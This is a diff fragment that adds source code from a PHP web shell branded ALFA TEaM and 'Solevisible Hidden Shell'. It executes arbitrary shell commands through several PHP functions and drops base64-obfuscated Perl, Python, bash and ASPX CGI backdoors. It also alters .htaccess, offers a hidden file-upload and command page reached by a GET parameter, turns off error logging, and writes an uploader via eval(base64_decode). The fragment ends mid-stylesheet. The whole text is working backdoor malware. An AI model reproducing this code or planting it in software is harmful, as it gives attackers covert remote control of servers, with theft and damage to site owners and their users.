+$alfax = array();
+$find = array();
+for($i=1;$i<=10;$i++){
+$alfax[] = $i;
+}
+foreach($args as $arg){
+$find[] = $arg;
+}
+echo '<script>';
+foreach($alfax as $alfa){
+if(in_array($alfa,$find))
+continue;
+echo 'alfa'.$alfa."_=";
+}
+echo '""</script>';
+}}
+function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
+	if(!$GLOBALS["DB_NAME"]["cgi_api"]){
+		return "";
+	}
+	if(isset($_COOKIE["alfacgiapi_mode"])){
+		return "";
+	}
+	$cmd_pure = $cmd;
+	$is_curl = function_exists('curl_version');
+	$is_socket = function_exists('fsockopen');
+	if($is_curl||$is_socket){
+		$recreate = false;
+		if(isset($_COOKIE["alfacgiapi"])){
+			if(!@file_exists("alfacgiapi/".$_COOKIE["alfacgiapi"].".alfa")){
+				$recreate = true;
+				$lang = $_COOKIE["alfacgiapi"];
+			}
+		}
+		if(!isset($_COOKIE["alfacgiapi"])||$recreate){
+			@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
+			$perl = 'jZFRT8IwFIXf/RXXOqWNsKoxPlAwRliERIbK9EUMGdsFGrYyt2Iky/ztdkMlJj74cpKee853k96Dfb7OUj6ViieYRgDQ6FdOtAr8iE99FcZS7a0zhEF/4DSb136GF+ciSaXSQDorpVHpht4k2ASN75ovdByN1VgRIWfUctynvPbg3D86I28ycLzesFsrAF+B3A1HHmF5vAFqyTpYS9wYffMjo1IxkaIf0pHX7buVYaRidYau57je5NZxb7xerWDiSipoQ5ZEUlN+xL/qs5UBBAvzAHoCtg3WgbFzM3u25Au0PyDj42MOfC7objfbkdpbUpmuwxkTZWhbO6S2zXjiB0tKAlKHBb5T65QxPkdRQv6RkioveQXYbSDjEwJyBjTEmVQY0p8pY7+TJVwU5bcalwRxSAqWby8RYrAKcTKtrvM1X2CwNAmbtJIUL4nINpnGmP4VrVDs+6otXhWK4hM=';
+			$py = "bZDBS8MwGMXPy19R66EtzhRk7DA3L1rxItOt3gajTb6twTQJydexIf7vJqvMiR5CyHvv93jk8iLvnM1roXJzwEYrgvYwIQPRGm0xYluB9W1/UVBVLSHNCOwZGPQpUzlHvqPaDX1sWFcOxiOy0baNZgGkjwIkX6K21RZSUDthtZp9JIvi9a1YluvnonyaPyST5GW+LJPPjLCWezIU0C3grpIdpIkXE281wN7/MYPsbWOFwii+1wpB4TUeDEwQ9pg32MqVXalwYiI2ka8L84/5fjGtxyMOTHNIj3XZVTw1Fu5iMmCNkHztkAs1jE4P3aFfoh012oC6Sf/WtDzLftGUSe3CBw4suE4G/ryOWqh4eo4E8cT0a3uSOrTC/KjxND+O/QI=";
+			$bash = "rVRdj5pAFH2uv+I6DGa1Iaybpg9amrRboptYbV360JQGWRiFyPI5WreU/95hoCyjsfFh52nm3nM/zuTcK3XVBz9UH+zM6xDHi0AhgG6jkJKQKvQpJiOg5EBVjz4GZmiGqLPehQ71oxCcjW9tCLW+LO4Na2+n2VU/7wA7PwDhpf71m87sn3VjuviEoKsBKoEIfkKvBymhuzSs0V1QfrMQFrD8bt0by7v5xDqH5cjbxdzQ54Y10+cTYyrCXqXEdkGZwxEKTtLzjHVUIdJyiRO5hHF6poQlUEICw5OegsixA9gDBY+/qYZwPlTV1yoUsoy47ZfnB6RMkku0AGVD4RoUmzHJaVH9jcxYjMGNOLw8+zLNvmAIWTblQYEaDy9ApYHcsvnrC7JTj4RNRHk8jUFG16ObQjBXBZgVCea6I7T6pxOTnQPOvWLV4NY+v7pRSPiFQ6uw/3w3U5Gon/KzAwo3Zz47gRi27MszbnPsjAAegv9MbqIbfaH3RmR5WwZFLZ1EO3b0ROrjcfMslSPmPpmDCypz8Nnylfd8Dx8XxvRF+b0MhaS4nAbJbIdfMs9f0+qmIcADECemrpwcj0fMC8pyrz0Z29IYy7LWNnLZxtJAa9mqdiUcC+Hl3hoiYPPyYTZDoHDlZirgLaj1IOGsJmwKpMghjlLK3FukoZWwQcBEeG+iFRIHoxmElv65toDV7iQ7kj5p+IqPD3YeXfgDbEWTt29AUarU/WpdNxiPONuzqHKpv4tT8t50UId1FbBdwWsULb9aA/4C";
+			$aspx = "jZNda9swFIavk18hNAoOAXdsozdLyrrUKYaRlriNN0IuFPvEFbUl70jOB2P97T1SPBo8ynZlS+d53/Ph49HZF3YnCmDfhCoaehnzyTvOIiXWJSwk7BIrLF1uRGmAs7PL/ogUcVVrtGwmKjC1yCieHIyFKkxhHT7E7jHRyqIuzb8111IUShsrs/+A41vPENTvGYtSFSyrcjZmc/jZgLHhVGO15HTHV59fkUfInv6G3K3H5CZokTHj6cfZdn2z+CC+z+of1b7cVNOdWLwf88Gvfq+3PlhYrlgurCDDtipqdgtIvqirr8LAxafEJw6ojgH59441tvQ97G14lUziOFKZzok7nsIbsK3O2ZOQlHeoMzCG1aRXsGPtOfC2dUifB22sNjqcINCXmulUqlzviLbYQBeayhLcUCnsZhTCHniXucKiqUBZ46DzjHE2dDPuYg8Gkkcoy2gPWWOdo9+RLjaHXCJk1JhQucD8trF1Y98orwtHiBrfYFONTzSqay/QePDVnjYTHAfYroD+k9dHT0qhpCK/15HKgwF1+hr2yU+jzntO+6iVgTBFaSHgS6NL2Eoj6Xd5FrVcjWqESz48phvy0bk/O+3vPi3uCw==";
+			if($lang=="perl")$source = $perl;elseif($lang=="py")$source = $py;else $source = $bash;
+			if($lang == "aspx"){
+				alfaWriteTocgiapi("aspx.aspx",$aspx);
+			}else{
+				alfaWriteTocgiapi($lang.".alfa",$source);
+			}
+			alfacgihtaccess('cgi', "alfacgiapi/");
+		}else{
+			$lang = $_COOKIE["alfacgiapi"];
+		}
+		$cgi_ext = ".alfa";
+		if($lang=="aspx"){
+			$cgi_ext = ".aspx";
+		}
+		$cgi_url = __ALFA_DATA_FOLDER__."/alfacgiapi/".$lang.$cgi_ext;
+		$cmd = "check=W3NvbGV2aXNpYmxlfmFwaV0=&cmd=".__ZW5jb2Rlcg("cd ".$GLOBALS['cwd'].";".$cmd);
+		if($is_curl){
+			$address = ($_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://").$_SERVER["SERVER_NAME"].dirname($_SERVER["REQUEST_URI"])."/".$cgi_url;
+			$post = new AlfaCURL();
+			$data = $post->Send($address, "post", $cmd);
+		}elseif($is_socket){
+			$server = $_SERVER["SERVER_NAME"];
+			$uri = dirname($_SERVER["REQUEST_URI"])."/".$cgi_url;
+			$data = _alfa_fsockopen($server,$uri,$cmd);
+		}
+		$out = "";
+		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
+			if($set_cookie){
+				__alfa_set_cookie("alfacgiapi", $lang);
+			}
+			if(@preg_match("/<pre>(.*?)<\/pre>/s", $data, $res)){
+				$out = $res[1];
+			}
+		}elseif($lang=="perl"){
+			return _alfa_cgicmd($cmd_pure,"py",$set_cookie);
+		}elseif($lang=="py"){
+			return _alfa_cgicmd($cmd_pure,"bash",$set_cookie);
+		}elseif($lang=="bash" && $GLOBALS['sys']=="win"){
+			return _alfa_cgicmd($cmd_pure,"aspx",$set_cookie);
+		}else{
+			if($set_cookie){
+				__alfa_set_cookie("alfacgiapi_mode", "off");
+			}
+		}
+		return trim($out);
+	}else{
+		return "";
+	}
+}
+function alfaGetCwd(){
+	if(function_exists("getcwd")){
+		return @getcwd();
+	}else{
+		return dirname($_SERVER["SCRIPT_FILENAME"]);
+	}
+}
+function alfaEx($in,$re=false,$cgi=true,$all=false){
+	$data = _alfa_php_cmd($in,$re);
+	if(empty($data)&&$cgi||$all){
+		if($GLOBALS['sys']=='unix'){
+			if(strlen(_alfa_php_cmd("whoami"))==0||$all){
+				$cmd = _alfa_cgicmd($in);
+				if(!empty($cmd)){
+					return $cmd;
+				}
+			}
+		}
+	}
+	return $data;
+}
+function _alfa_php_cmd($in,$re=false){
+$out='';
+try{
+if($re)$in=$in." 2>&1";
+if(function_exists('exec')){
+@exec($in,$out);
+$out = @join("\n",$out);
+}elseif(function_exists('passthru')) {
+ob_start();
+@passthru($in);
+$out = ob_get_clean();
+}elseif(function_exists('system')){
+ob_start();
+@system($in);
+$out = ob_get_clean();
+} elseif (function_exists('shell_exec')) {
+$out = shell_exec($in);
+}elseif(function_exists("popen")&&function_exists("pclose")){
+if(is_resource($f = @popen($in,"r"))){
+$out = "";
+while(!@feof($f))
+$out .= fread($f,1024);
+pclose($f);
+}
+}elseif(function_exists('proc_open')){
+$pipes = array();
+$process = @proc_open($in.' 2>&1', array(array("pipe","w"), array("pipe","w"), array("pipe","w")), $pipes, null);
+$out=@stream_get_contents($pipes[1]);
+}elseif(class_exists('COM')){
+$alfaWs = new COM('WScript.shell');
+$exec = $alfaWs->exec('cmd.exe /c '.$_POST['alfa1']);
+$stdout = $exec->StdOut();
+$out=$stdout->ReadAll();
+}
+}catch(Exception $e){}
+return $out;
+}
+function _alfa_fsockopen($server,$uri,$post){
+	$socket = @fsockopen($server, 80, $errno, $errstr, 15);
+	if($socket){
+		$http  = "POST {$uri} HTTP/1.0\r\n";
+		$http .= "Host: {$server}\r\n";
+		$http .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
+		$http .= "Content-Type: application/x-www-form-urlencoded\r\n";
+		$http .= "Content-length: " . strlen($post) . "\r\n";
+		$http .= "Connection: close\r\n\r\n";
+		$http .= $post . "\r\n\r\n";
+		fwrite($socket, $http);
+		$contents = "";
+		while (!@feof($socket)) {
+			$contents .= @fgets($socket, 4096);
+		}
+		list($header, $body) = explode("\r\n\r\n", $contents, 2);
+		@fclose($socket);
+		return $body;
+	}else{
+		return "";
+	}
+}
+if(isset($_GET["solevisible"])){
+@error_reporting(E_ALL ^ E_NOTICE);
+echo '<html>';
+echo "<title>Solevisible Hidden Shell</title>";
+echo "<body bgcolor=#000000>";
+echo '<b><big><font color=#7CFC00>Kernel : </font><font color="#FFFFF">'.(function_exists('php_uname')?php_uname():'???').'</font></b></big>';
+$safe_mode = @ini_get('safe_mode');
+if($safe_mode){$r = "<b style='color: red'>On</b>";}else{$r = "<b style='color: green'>Off</b>";}
+echo "<br><b style='color: #7CFC00'>OS: </font><font color=white>" . PHP_OS . "</font><br>";
+echo "<b style='color: #7CFC00'>Software: </font><font color=white>" . $_SERVER ['SERVER_SOFTWARE'] . "</font><br>";
+echo "PHP Version: <font color=white>" . PHP_VERSION .  "</font><br />";
+echo "PWD:<font color=#FFFFFF> " . str_replace("\\","/",@alfaGetCwd()) . "/<br />";
+echo "<b style='color: #7CFC00'>Safe Mode : $r<br>";
+echo"<font color=#7CFC00>Disable functions : </font>";
+$disfun = @ini_get('disable_functions');
+if(empty($disfun)){$disfun = '<font color="green">NONE</font>';}
+echo"<font color=red>";
+echo "$disfun";
+echo"</font><br>";
+echo "<b style='color: #7CFC00'>Your Ip Address is :  </font><font color=white>" . $_SERVER['REMOTE_ADDR'] . "</font><br>";
+echo "<b style='color: #7CFC00'>Server Ip Address is :  </font><font color=white>".(function_exists('gethostbyname')?@gethostbyname($_SERVER["HTTP_HOST"]):'???')."</font><br><p>";
+echo '<hr><center><form onSubmit="this.upload.disabled=true;this.cwd.value = btoa(unescape(encodeURIComponent(this.cwd.value)));" action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo 'CWD: <input type="text" name="cwd" value="'.str_replace("\\","/",@alfaGetCwd()).'/" size="59"><p><input type="file" name="file" size="45"><input name="upload" type="submit" id="_upl" value="Upload"></p></form></center>';
+if(isset($_FILES['file'])){
+if(@move_uploaded_file($_FILES['file']['tmp_name'], __ZGVjb2Rlcg(@$_POST['cwd']).'/'.$_FILES['file']['name'])){echo '<b><font color="#7CFC00"><center>Upload Successfully ;)</font></a><font color="#7CFC00"></b><br><br></center>'; }
+else{echo '<center><b><font color="#7CFC00">Upload failed :(</font></a><font color="#7CFC0"></b></center><br><br>'; }
+}
+echo '<hr><form onSubmit="this.execute.disabled=true;this.command_solevisible.value = btoa(unescape(encodeURIComponent(this.command_solevisible.value)));" method="POST">Execute Command: <input name="command_solevisible" value="" size="59" type="text" align="left" ><input name="execute" value="Execute" type="submit"><br></form>
+<hr><pre>';
+if(isset($_POST['command_solevisible'])){
+if(strtolower(substr(PHP_OS,0,3))=="win")$separator='&';else $separator=';';
+$solevisible = "cd '".addslashes(str_replace("\\","/",@alfaGetCwd()))."'".$separator."".__ZGVjb2Rlcg($_POST['command_solevisible']);
+echo alfaEx($solevisible);
+}
+echo'</pre>
+</body></html>';
+exit;}
+@error_reporting(E_ALL ^ E_NOTICE);
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@ini_set('magic_quotes_runtime', 0);
+@set_time_limit(0);
+if(function_exists('set_magic_quotes_runtime')){
+@set_magic_quotes_runtime(0);
+}
+foreach($_POST as $key => $value){
+if(is_array($_POST[$key])){
+$i=0;
+foreach($_POST[$key] as $f) {
+$f = trim(str_replace(' ', '+',$f));
+$_POST[$key][$i] = decrypt_post($f);
+$i++;
+}
+}else{
+$value = trim(str_replace(' ', '+',$value));
+$_POST[$key] = decrypt_post($value);
+}
+}
+$default_action = 'FilesMan2';//'FilesMan';
+$default_use_ajax = true;
+$default_charset = 'Windows-1251';
+if(strtolower(substr(PHP_OS,0,3))=="win")
+$GLOBALS['sys']='win';
+else
+$GLOBALS['sys']='unix';
+$GLOBALS['home_cwd'] = @alfaGetCwd();
+$GLOBALS["need_to_update_header"] = "false";
+$GLOBALS['glob_chdir_false'] = false;
+if(isset($_POST['c'])){
+if(!@chdir($_POST['c'])){
+	$GLOBALS['glob_chdir_false'] = true;
+}
+}
+$GLOBALS['cwd'] = (isset($_POST['c']) && @is_dir($_POST['c']) ?$_POST['c']:@alfaGetCwd());
+if($GLOBALS['glob_chdir_false']){
+	$GLOBALS['cwd'] = (isset($_POST['c']) && !empty($_POST['c']) ? $_POST['c'] : @alfaGetCwd());
+}
+if($GLOBALS['sys'] == 'win'){
+$GLOBALS['home_cwd'] = str_replace("\\", "/", $GLOBALS['home_cwd']);
+$GLOBALS['cwd'] = str_replace("\\", "/", $GLOBALS['cwd']);
+}
+if($GLOBALS['cwd'][strlen($GLOBALS['cwd'])-1] != '/' )$GLOBALS['cwd'] .= '/';
+if(!function_exists('sys_get_temp_dir')){function sys_get_temp_dir() {foreach (array('TMP', 'TEMP', 'TMPDIR') as $env_var) {if ($temp = getenv($env_var)) {return $temp;}}$temp = tempnam($GLOBALS['__file_path'], '');if (_alfa_file_exists($temp,false)) {unlink($temp);return dirname($temp);}return null;}}
+if(!function_exists("mb_strlen")){
+	function mb_strlen($str, $c=""){
+		return strlen($str);
+	}
+}
+if(!function_exists("mb_substr")){
+	function mb_substr($str, $start, $end, $c=""){
+		return substr($str, $start, $end);
+	}
+}
+define("ALFA_TEMPDIR", (function_exists("sys_get_temp_dir") ? (@is_writable(str_replace('\\','/',sys_get_temp_dir()))?sys_get_temp_dir():(@is_writable('.')?'.':false)) : false));
+function alfahead(){
+$GLOBALS['__ALFA_SHELL_CODE'] = 'PD9waHAgZWNobyAiPHRpdGxlPlNvbGV2aXNpYmxlIFVwbG9hZGVyPC90aXRsZT5cbjxib2R5IGJnY29sb3I9IzAwMDAwMD5cbjxicj5cbjxjZW50ZXI+PGZvbnQgY29sb3I9XCJ3aGl0ZVwiPjxiPllvdXIgSXAgQWRkcmVzcyBpczwvYj4gPGZvbnQgY29sb3I9XCJ3aGl0ZVwiPjwvZm9udD48L2NlbnRlcj5cbjxiaWc+PGZvbnQgY29sb3I9XCIjN0NGQzAwXCI+PGNlbnRlcj5cbiI7ZWNobyAkX1NFUlZFUlsnUkVNT1RFX0FERFInXTtlY2hvICI8L2NlbnRlcj48L2ZvbnQ+PC9hPjxmb250IGNvbG9yPVwiIzdDRkMwMFwiPlxuPGJyPlxuPGJyPlxuPGNlbnRlcj48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48YmlnPlNvbGV2aXNpYmxlIFVwbG9hZCBBcmVhPC9iaWc+PC9mb250PjwvYT48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48L2ZvbnQ+PC9jZW50ZXI+PGJyPlxuPGNlbnRlcj48Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnIG5hbWU9J3VwbG9hZGVyJz4iO2VjaG8gJzxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI0NSI+PGlucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT48L2NlbnRlcj4nO2lmKGlzc2V0KCRfUE9TVFsnX3VwbCddKSYmJF9QT1NUWydfdXBsJ109PSAiVXBsb2FkIil7aWYoQG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkge2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBTdWNjZXNzZnVsbHkgOyk8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO31lbHNle2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBmYWlsZWQgOig8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO319ZWNobyAnPGNlbnRlcj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjMwcHg7IGJhY2tncm91bmQ6IHVybCgmcXVvdDtodHRwOi8vc29sZXZpc2libGUuY29tL2ltYWdlcy9iZ19lZmZlY3RfdXAuZ2lmJnF1b3Q7KSByZXBlYXQteCBzY3JvbGwgMCUgMCUgdHJhbnNwYXJlbnQ7IGNvbG9yOiByZWQ7IHRleHQtc2hhZG93OiA4cHggOHB4IDEzcHg7Ij48c3Ryb25nPjxiPjxiaWc+c29sZXZpc2libGVAZ21haWwuY29tPC9iPjwvYmlnPjwvc3Ryb25nPjwvc3Bhbj48L2NlbnRlcj4nOz8+';
+$alfa_uploader = '$x = base64_decode("'.$GLOBALS['__ALFA_SHELL_CODE'].'");$solevisible = fopen("solevisible.php","w");fwrite($solevisible,$x);';
+define("ALFA_UPLOADER", "eval(base64_decode('".__ZW5jb2Rlcg($alfa_uploader)."'))");
+if(!isset($_POST['ajax'])){
+function Alfa_GetDisable_Function(){
+$disfun = @ini_get('disable_functions');
+$afa = '<span class="header_show_all">All Functions Accessible</span>';
+if(empty($disfun))return($afa);
+$s = explode(',',$disfun);
+$s = array_unique($s);
+$i=0;
+$b=0;
+$func = array('system','exec','shell_exec','proc_open','popen','passthru','symlink','dl');
+$black_list = array();
+$allow_list = array();
+foreach($s as $d){
+	$d=trim($d);
+	if(empty($d)||!is_callable($d))continue;
+	if(!function_exists($d)){
+		if(in_array($d,$func)){
+			$dis .= $d." | ";$b++;
+			$black_list[] = $d;
+		}else{
+			$allow_list[] = $d;
+		}
+		$i++;
+	}
+}
+if($i==0)return($afa);
+if($i <= count($func)){
+$all = array_values(array_merge($black_list, $allow_list));
+return('<span class="disable_functions">'.implode(" | ", $all).'</span>');
+}
+return('<span class="disable_functions">'.$dis.'</span><a id="menu_opt_GetDisFunc" href=javascript:void(0) onclick="alfa_can_add_opt = true;g(\'GetDisFunc\',null,\'wp\');"><span class="header_show_all">Show All ('.$i.')</span></a>');
+}
+function AlfaNum(){
+$args = func_get_args();
+$alfax = array();
+$find = array();
+for($i=1;$i<=10;$i++){
+$alfax[] = $i;
+}
+foreach($args as $arg){
+$find[] = $arg;
+}
+echo '<script>';
+foreach($alfax as $alfa){
+if(in_array($alfa,$find))
+continue;
+echo 'alfa'.$alfa."_=";
+}
+echo '""</script>';
+}
+if(empty($_POST['charset']))
+$_POST['charset'] = $GLOBALS['default_charset'];
+$freeSpace = function_exists('diskfreespace')?@diskfreespace($GLOBALS['cwd']):'?';
+$totalSpace = function_exists('disk_total_space')?@disk_total_space($GLOBALS['cwd']):'?';
+$totalSpace = $totalSpace?$totalSpace:1;
+$on="<span class='header_on'> ON </span>";
+$of="<span class='header_off'> OFF </span>";
+$none="<span class='header_none'> NONE </span>";
+if(function_exists('ssh2_connect'))
+$ssh2=$on;
+else
+$ssh2=$of;
+if(function_exists('curl_version'))
+$curl=$on;
+else
+$curl=$of;
+if(function_exists('mysql_get_client_info')||class_exists('mysqli'))
+$mysql=$on;
+else
+$mysql=$of;
+if(function_exists('mssql_connect'))
+$mssql=$on;
+else
+$mssql=$of;
+if(function_exists('pg_connect'))
+$pg=$on;
+else
+$pg=$of;
+if(function_exists('oci_connect'))
+$or=$on;
+else
+$or=$of;
+if(@ini_get('disable_functions'))
+$disfun=@ini_get('disable_functions');
+else
+$disfun="All Functions Enable";
+if(@ini_get('safe_mode'))
+$safe_modes="<span class='header_off'>ON</span>";
+else
+$safe_modes="<span class='header_on'>OFF</span>";
+$cgi_shell="<span class='header_off' id='header_cgishell'>OFF</span>";
+if(@ini_get('open_basedir')){
+$basedir_data = @ini_get('open_basedir');
+if(strlen($basedir_data)>120){
+$open_b=substr($basedir_data,0, 120)."...";
+}else{
+$open_b = $basedir_data;
+}
+}else{$open_b=$none;}
+if(@ini_get('safe_mode_exec_dir'))
+$safe_exe=@ini_get('safe_mode_exec_dir');
+else
+$safe_exe=$none;
+if(@ini_get('safe_mode_include_dir'))
+$safe_include=@ini_get('safe_mode_include_dir');
+else
+$safe_include=$none;
+if(!function_exists('posix_getegid'))
+{
+$user = function_exists("get_current_user")?@get_current_user():"????";
+$uid = function_exists("getmyuid")?@getmyuid():"????";
+$gid = function_exists("getmygid")?@getmygid():"????";
+$group = "?";
+}else{
+$uid = function_exists("posix_getpwuid")&&function_exists("posix_geteuid")?@posix_getpwuid(posix_geteuid()):array("name"=>"????", "uid"=>"????");
+$gid = function_exists("posix_getgrgid")&&function_exists("posix_getegid")?@posix_getgrgid(posix_getegid()):array("name"=>"????", "gid"=>"????");
+$user = $uid['name'];
+$uid = $uid['uid'];
+$group = $gid['name'];
+$gid = $gid['gid'];
+}
+$cwd_links = '';
+$path = explode("/", $GLOBALS['cwd']);
+$n=count($path);
+for($i=0; $i<$n-1; $i++) {
+$cwd_links .= "<a class='header_pwd' onclick='g(\"FilesMan\",\"";
+$cach_cwd_path = "";
+for($j=0; $j<=$i; $j++){
+$cwd_links .= $path[$j].'/';
+$cach_cwd_path .= $path[$j].'/';
+}
+$cwd_links .= "\")' path='".$cach_cwd_path."' href='#action=fileman&path=".$cach_cwd_path."'>".$path[$i]."/</a>";
+}
+$drives = "";
+foreach(range('a','z') as $drive)
+if(@is_dir($drive.':\\'))
+$drives .= '<a href="javascript:void(0);" class="header_drive" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
+$csscode ='	-moz-animation-name: spin;-moz-animation-iteration-count: infinite;-moz-animation-timing-function: linear;-moz-animation-duration: 1s;-webkit-animation-name: spin;-webkit-animation-iteration-count: infinite;-webkit-animation-timing-function: linear;-webkit-animation-duration: 1s;-ms-animation-name: spin;-ms-animation-iteration-count: infinite;-ms-animation-timing-function: linear;-ms-animation-duration: 1s;animation-name: spin;animation-iteration-count: infinite;animation-timing-function: linear;animation-duration: 1s;';
+echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="ROBOTS" content="NOINDEX, NOFOLLOW" />
+<link href="'.__showicon('alfamini').'" rel="icon" type="image/x-icon"/>
+<title>..:: '.$_SERVER['HTTP_HOST'].' ~ ALFA TEaM Shell - v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ::..</title>
+<style type="text/css">';?>
+.hlabale{color:#67abdf;border-radius:4px;border:1px solid #27979b;margin-left... (424 KB left)
